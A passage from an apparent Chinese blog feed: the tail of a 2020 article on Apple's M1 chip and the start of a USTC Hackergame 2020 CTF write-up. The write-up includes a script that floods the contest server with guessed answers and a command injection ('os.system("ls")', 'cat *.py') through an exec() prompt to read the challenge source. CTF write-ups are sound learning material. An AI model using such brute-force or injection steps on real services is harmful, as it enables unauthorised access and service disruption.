上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span 